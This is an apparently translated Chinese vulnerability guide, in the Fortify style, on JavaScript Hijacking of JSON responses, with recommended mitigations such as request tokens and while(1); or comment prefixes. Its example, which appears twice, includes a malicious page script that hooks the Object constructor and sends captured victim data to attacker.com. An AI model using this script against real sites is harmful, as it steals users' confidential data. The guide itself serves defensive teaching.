<p>JavaScript 中最常见的信息传输格式为 JavaScript Object Notation (JSON)。JSON RFC 将 JSON 语法定义为 JavaScript 类实例文本化定义语法 (object literal syntax)的子集。JSON 基于两种数据结构类型：阵列和对象。所有可以作为一个或多个有效 JavaScript 语句进行解析的数据传送格式都容易受到 JavaScript 劫持的攻击。JSON 使 JavaScript 劫持变得更加容易，因为 JSON 数组坚持认为它自己就是有效的 JavaScript 指令。因为数组是交换列表的一种正常形式，在应用程序需要交换多个值时会普遍使用该形式。换句话说，一个 JSON 数组会直接受到 JavaScript 劫持的攻击。一个 JSON 对象只在其被一些其他 JavaScript 结构包围时才会受到攻击，这些 JavaScript 结构坚持认为它们自己就是有效的 JavaScript 指令。</p>
<p>示例 1：在以下示例中，开头显示了一个在 Web 应用程序的客户端和服务器组件之间进行的合法 JSON 交互，这一 Web 应用程序用于管理潜在商机。接下来，它说明了攻击者如何模仿客户端获取服务器端返回的机密信息。注意，本例子是专为基于 Mozilla 的浏览器而编写的代码。若在创建对象时，没有使用 new 运算符，则其他主流浏览器会禁止重载默认构造函数。</p>
<p>客户端向服务器请求数据，并通过以下代码评估 JSON 结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>当此代码运行时，它会生成一个如下所示的 HTTP 请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /object.json HTTP/1.1</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Host: www.example.com</span><br><span class="line"></span><br><span class="line">Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR</span><br></pre></td></tr></table></figure>
<p>（在本 HTTP 响应和随后的响应中，我们省略了与该解释没有直接关系的 HTTP 头信息。）</p>
<p>服务器使用 JSON 格式的数组进行响应：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Cache-control: private</span><br><span class="line"></span><br><span class="line">Content-Type: text/JavaScript; charset=utf-8</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[&#123;&quot;fname&quot;:&quot;Brian&quot;, &quot;lname&quot;:&quot;Chess&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:60000.00, &quot;email&quot;:&quot;brian@example.com&quot; &#125;,</span><br><span class="line"></span><br><span class="line"> &#123;&quot;fname&quot;:&quot;Katrina&quot;, &quot;lname&quot;:&quot;O&apos;Neil&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:120000.00, &quot;email&quot;:&quot;katrina@example.com&quot; &#125;,</span><br><span class="line"></span><br><span class="line"> &#123;&quot;fname&quot;:&quot;Jacob&quot;, &quot;lname&quot;:&quot;West&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:45000.00, &quot;email&quot;:&quot;jacob@example.com&quot; &#125;]</span><br></pre></td></tr></table></figure>
<p>这种情况下，JSON 中包含了与当前用户相关的机密信息（一组潜在商机数据）。其他用户如果不知道该用户的会话标识符，便无法访问这些信息。（在大多数现代 Web 应用程序中，会话标识符存储在 cookie 中。）然而，如果受害者访问某个恶意网站，恶意网站就可以使用 JavaScript 劫持提取信息。如果受害者受到欺骗后，访问包含以下恶意代码的网页，受害者的重要信息就会被发送到攻击者的网站中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">// override the constructor used to create all objects so</span><br><span class="line"></span><br><span class="line">// that whenever the &quot;email&quot; field is set, the method</span><br><span class="line"></span><br><span class="line">// captureObject() will run. Since &quot;email&quot; is the final field,</span><br><span class="line"></span><br><span class="line">// this will allow us to steal the whole object.</span><br><span class="line"></span><br><span class="line">function Object() &#123;</span><br><span class="line"></span><br><span class="line"> this.email setter = captureObject;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Send the captured object back to the attacker&apos;s web site</span><br><span class="line"></span><br><span class="line">function captureObject(x) &#123;</span><br><span class="line"></span><br><span class="line">  var objString = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">  for (fld in this) &#123;</span><br><span class="line"></span><br><span class="line">    objString += fld + &quot;: &quot; + this[fld] + &quot;, &quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  objString += &quot;email: &quot; + x;</span><br><span class="line"></span><br><span class="line">  var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">  req.open(&quot;GET&quot;, &quot;http://attacker.com?obj=&quot; +</span><br><span class="line"></span><br><span class="line">           escape(objString),true);</span><br><span class="line"></span><br><span class="line">  req.send(null);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Use a script tag to bring in victim&apos;s data --&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;http://www.example.com/object.json&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>恶意代码使用脚本标签以在当前页面包含 JSON 对象。Web 浏览器将使用该请求发送相应的会话 cookie。换言之，处理此请求时将认为其源自合法应用程序。</p>
<p>当 JSON 阵列到达客户端时，将在恶意页面的上下文中对其进行评估。为了看清 JSON 的评估，恶意页面重新定义了用于创建新对象的 JavaScript 功能。通过此方法，恶意代码已插入一个钩子，该钩子允许其访问每个对象的创建并将对象的内容传递回恶意网站。与之相反，其他攻击可能会覆盖阵列默认的构造函数。为在混合应用中使用而建的应用程序有时会在每一 JavaScript 消息的末端调用回调功能。回调功能意味着将由混合应用中的其他应用程序定义。回调功能使 JavaScript 挟持攻击变得容易 – 攻击者要做的就是定义该功能。应用程序可以是混合应用 - 友好型或安全型，但不可能两者兼备。如果用户未登录到易受攻击的网站，攻击者可以要求用户登录，然后显示该应用程序的合法登录页面。</p>
<p>这不是钓鱼攻击 – 攻击者未获得用户凭证的访问权限 – 因此反钓鱼对策将无法打败攻击。更复杂的攻击可能会通过使用 JavaScript 动态生成脚本标签，向应用程序作出一系列请求。此相同技术有时会用于创建应用程序混合应用。唯一的不同是，在此混合应用情况中，涉及的应用程序之一是恶意的。</p>
<h5 id="RECOMMENDATIONS-8"><a href="#RECOMMENDATIONS-8" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>所有使用 JavaScript 进行交流的程序需要采取以下防范措施：1) 拒绝恶意请求：— 在每个返回给 JavaScript 的请求中使用一些令人难以猜测的标识符，如会话标识符。允许服务器验证请求的来源可以防范跨站点请求的伪装攻击。2) 避免直接执行 JavaScript 响应：包括某些响应中的字符，这些响应只有经过了修改，才能成功地转到 JavaScript 解释器进行处理。这样可以防止攻击者使用<code>&lt;script&gt;</code> 标签看清 JavaScript 的执行过程。防范 JavaScript 劫持的最佳方法是同时采取上述两种防范策略。</p>
<p>拒绝恶意请求</p>
<p>从服务器的角度来看，JavaScript 劫持攻击类似于跨站点伪装请求，因此，防止跨站点伪装请求也就可以防止 JavaScript 劫持攻击。为了便于探测各种恶意请求，每个请求均应包含攻击者难以猜测的参数。一种方法是将会话 cookie 作为参数添加到请求中。服务器接收到这样一个请求时，它可以检查并确定会话 cookie 是否与请求中的参数值匹配。恶意代码无法取得会话 cookie（cookie 也需要遵循同源策略 (Same Origin Policy)），因此，攻击者即使制造了请求，也很难再通过检验了。也可以使用其他机密信息代替会话 cookie；只要这个机密信息难以猜测，可以在合法应用程序能够访问的上下文中使用，同时又无法通过其他的域进行访问，就可以防止攻击者制造有效的请求。</p>
<p>有一些框架仅能运行在客户端上。换言之，它们完全由 JavaScript 编写而成，对服务器的工作情况一无所知。这意味着它们并不知道会话 cookie 的名称。即使并不清楚会话 cookie 的名称，它们也能参与基于 cookie 的防范，途径就是将所有的 cookie 附加到发送给服务器的各个请求中。</p>
<p>示例 2：以下 JavaScript 片段描述了这种“盲客户端”策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var httpRequest = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">var cookies=&quot;cookies=&quot;+escape(document.cookie);</span><br><span class="line"></span><br><span class="line">http_request.open(&apos;POST&apos;, url, true);</span><br><span class="line"></span><br><span class="line">httpRequest.send(cookies);</span><br></pre></td></tr></table></figure>
<p>服务器也可以检查 HTTP referer 头信息，以确保请求来自于合法的应用程序，而不是恶意的应用程序。从历史上看，referer 头信息一直都未受到过信任，因此，我们并不建议您将它作为安全机制的基础。您可以为服务器装入一种针对 JavaScript hijacking 的防范方法，即让服务器只对 HTTP POST 请求做出响应，而不回应任何 HTTP GET 请求。这是一项防御技术，原因是 <code>&lt;script&gt;</code> 标签通常使用 GET 方法从外部资源文件中加载 JavaScript。然而，这种防范措施并非尽善尽美。Web 应用程序的专家一致鼓励采用 GET 方法提高性能。如果在 HTTP 方法的选择上缺乏安全方面的考虑，这意味着未来的某一时刻，程序员可能会误认为这种功能上的不足是疏忽所致，而没有将它作为一种安全预警加以认识，进而修改了应用程序以响应 GET 请求。</p>
<p>防止直接执行响应</p>
<p>为了使恶意站点无法执行包含 JavaScript 的响应，合法的客户端应用程序可以利用允许执行前对接收的数据进行修改这一权限，而恶意的应用程序则只能使用 <code>&lt;script&gt;</code>标签执行响应。当服务器序列化某个对象时，该对象应包括一个前缀（也可以是后缀），从而使它无法通过 <code>&lt;script&gt;</code> 标签执行 JavaScript。合法的客户端应用程序可以在运行 JavaScript 前删除这些无关的数据。</p>
<p>例 3：该方法可以通过多种方式来实现。以下例子演示了两种方式。第一种，服务器可以把以下指令作为消息的前缀：</p>
<p><code>while(1);</code></p>
<p>除非客户端删除此前缀，否则对此消息求值会将 JavaScript 解释器置于一个无限循环中。客户端会搜索并删除如下前缀：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    if (txt.substr(0,9) == &quot;while(1);&quot;) &#123;</span><br><span class="line"></span><br><span class="line">      txt = txt.substring(10);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>第二种，服务器可以在 JavaScript 附近加注注释字符，这些注释字符必须在 JavaScript 被送往 eval() 函数前删除。以下 JSON 对象已加入了一块注释：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"></span><br><span class="line">[&#123;&quot;fname&quot;:&quot;Brian&quot;, &quot;lname&quot;:&quot;Chess&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:60000.00, &quot;email&quot;:&quot;brian@example.com&quot; &#125;</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">客户端可以搜索并删除如下注释字符：</span><br><span class="line"></span><br><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    if (txt.substr(0,2) == &quot;/*&quot;) &#123;</span><br><span class="line"></span><br><span class="line">      txt = txt.substring(2, txt.length - 2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>任何通过<code>&lt;script&gt;</code> 标签来提取敏感 JavaScript 的恶意站点都将无法获取其中所包含的数据。</p>
<p>自第 5 版 EcmaScript 起，已不可能攻击 JavaScript 数组构造函数。</p>
<h5 id="REFERENCES-8"><a href="#REFERENCES-8" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] B. Chess, Y. O’Neil, and J. West JavaScript Hijacking </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001167 </p>
<p>[3] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-18 Mobile Code (P2) </p>
<p>[5] Standards Mapping - OWASP Application Security Verification Standard 4.0 3.5.3 Token-based Session Management, 5.3.6 Output Encoding and Injection Prevention Requirements, 14.5.2 Validate HTTP Request Header Requirements, 14.5.3 Validate HTTP Request Header Requirements </p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage </p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-003300 CAT II </p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-003300 CAT II </p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-003300 CAT II </p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-003300 CAT II </p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-003300 CAT II </p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-003300 CAT II </p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-003300 CAT II </p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-003300 CAT II </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-003300 CAT II </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-003300 CAT II </p>
<p>[17] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[18] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="JavaScript-Hijacking-Vulnerable-Framework"><a href="#JavaScript-Hijacking-Vulnerable-Framework" class="headerlink" title="JavaScript Hijacking: Vulnerable Framework"></a>JavaScript Hijacking: Vulnerable Framework</h4><h5 id="ABSTRACT-9"><a href="#ABSTRACT-9" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 JavaScript 符号来传送敏感数据的应用程序可能会存在 JavaScript hijacking 的漏洞，该漏洞允许未经授权的攻击者从一个易受攻击的应用程序中读取机密数据。</p>
<h5 id="EXPLANATION-9"><a href="#EXPLANATION-9" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果发生以下情况，应用程序可能会很容易受到 JavaScript 劫持的攻击：1) 将 JavaScript 对象用作数据传输格式 2) 处理机密数据。由于 JavaScript 劫持漏洞不会作为编码错误的直接结果出现，所以 Fortify 安全编码规则包会通过识别在 HTTP 响应中产生的 JavaScript 代码，引起人们对潜在的 JavaScript 劫持漏洞的注意。</p>
<p>Web 浏览器执行同源策略 (Same Origin Policy)，以保护用户免受恶意网站的攻击。同源策略 (Same Origin Policy) 规定：如果要使用 JavaScript 来访问某个网页的内容的话，则 JavaScript 和网页必须都来源于相同的域。若不采取同源策略 (Same Origin Policy)，恶意网站便可以使用客户端凭证来运行 JavaScript，从其他网站加载的敏感信息，并对这些信息进行提炼，然后将其返回给攻击者。通过 JavaScript 劫持，攻击者可以绕过 Web 应用程序中使用的同源策略 (Same Origin Policy)，该应用程序使用 JavaScript 来交流机密信息。同源策略 (Same Origin Policy) 中的漏洞是：通过这一策略，任何网站的 JavaScript 都可以被其他网站的上下文包含或执行。即使恶意网站不能直接在客户端上检查易受攻击的站点中加载的所有数据，但它仍可以通过配置一个特定的环境利用该漏洞。有了这样的环境，恶意网站就可以监视 JavaScript 的执行过程和任何可能发生的相关负面效应。由于许多 Web 2.0 应用程序使用 JavaScript 作为数据传输机制，因此，与传统的 Web 应用程序不同，它们往往很容易受到各种攻击。</p>
<p>JavaScript 中最常见的信息传输格式为 JavaScript Object Notation (JSON)。JSON RFC 将 JSON 语法定义为 JavaScript 类实例文本化定义语法 (object literal syntax)的子集。JSON 基于两种数据结构类型：阵列和对象。所有可以作为一个或多个有效 JavaScript 语句进行解析的数据传送格式都容易受到 JavaScript 劫持的攻击。JSON 使 JavaScript 劫持变得更加容易，因为 JSON 数组坚持认为它自己就是有效的 JavaScript 指令。因为数组是交换列表的一种正常形式，在应用程序需要交换多个值时会普遍使用该形式。换句话说，一个 JSON 数组会直接受到 JavaScript 劫持的攻击。一个 JSON 对象只在其被一些其他 JavaScript 结构包围时才会受到攻击，这些 JavaScript 结构坚持认为它们自己就是有效的 JavaScript 指令。</p>
<p>示例 1：在以下示例中，开头显示了一个在 Web 应用程序的客户端和服务器组件之间进行的合法 JSON 交互，这一 Web 应用程序用于管理潜在商机。接下来，它说明了攻击者如何模仿客户端获取服务器端返回的机密信息。注意，本例子是专为基于 Mozilla 的浏览器而编写的代码。若在创建对象时，没有使用 new 运算符，则其他主流浏览器会禁止重载默认构造函数。</p>
<p>客户端向服务器请求数据，并通过以下代码评估 JSON 结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>当此代码运行时，它会生成一个如下所示的 HTTP 请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /object.json HTTP/1.1</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Host: www.example.com</span><br><span class="line"></span><br><span class="line">Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR</span><br></pre></td></tr></table></figure>
<p>（在本 HTTP 响应和随后的响应中，我们省略了与该解释没有直接关系的 HTTP 头信息。）</p>
<p>服务器使用 JSON 格式的数组进行响应：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Cache-control: private</span><br><span class="line"></span><br><span class="line">Content-Type: text/JavaScript; charset=utf-8</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[&#123;&quot;fname&quot;:&quot;Brian&quot;, &quot;lname&quot;:&quot;Chess&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:60000.00, &quot;email&quot;:&quot;brian@example.com&quot; &#125;,</span><br><span class="line"></span><br><span class="line"> &#123;&quot;fname&quot;:&quot;Katrina&quot;, &quot;lname&quot;:&quot;O&apos;Neil&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:120000.00, &quot;email&quot;:&quot;katrina@example.com&quot; &#125;,</span><br><span class="line"></span><br><span class="line"> &#123;&quot;fname&quot;:&quot;Jacob&quot;, &quot;lname&quot;:&quot;West&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:45000.00, &quot;email&quot;:&quot;jacob@example.com&quot; &#125;]</span><br></pre></td></tr></table></figure>
<p>这种情况下，JSON 中包含了与当前用户相关的机密信息（一组潜在商机数据）。其他用户如果不知道该用户的会话标识符，便无法访问这些信息。（在大多数现代 Web 应用程序中，会话标识符存储在 cookie 中。）然而，如果受害者访问某个恶意网站，恶意网站就可以使用 JavaScript 劫持提取信息。如果受害者受到欺骗后，访问包含以下恶意代码的网页，受害者的重要信息就会被发送到攻击者的网站中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">// override the constructor used to create all objects so</span><br><span class="line"></span><br><span class="line">// that whenever the &quot;email&quot; field is set, the method</span><br><span class="line"></span><br><span class="line">// captureObject() will run. Since &quot;email&quot; is the final field,</span><br><span class="line"></span><br><span class="line">// this will allow us to steal the whole object.</span><br><span class="line"></span><br><span class="line">function Object() &#123;</span><br><span class="line"></span><br><span class="line"> this.email setter = captureObject;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Send the captured object back to the attacker&apos;s web site</span><br><span class="line"></span><br><span class="line">function captureObject(x) &#123;</span><br><span class="line"></span><br><span class="line">  var objString = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">  for (fld in this) &#123;</span><br><span class="line"></span><br><span class="line">    objString += fld + &quot;: &quot; + this[fld] + &quot;, &quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  objString += &quot;email: &quot; + x;</span><br><span class="line"></span><br><span class="line">  var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">  req.open(&quot;GET&quot;, &quot;http://attacker.com?obj=&quot; +</span><br><span class="line"></span><br><span class="line">           escape(objString),true);</span><br><span class="line"></span><br><span class="line">  req.send(null);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Use a script tag to bring in victim&apos;s data --&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;http://www.example.com/object.json&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>恶意代码使用脚本标签以在当前页面包含 JSON 对象。Web 浏览器将使用该请求发送相应的会话 cookie。换言之，处理此请求时将认为其源自合法应用程序。</p>
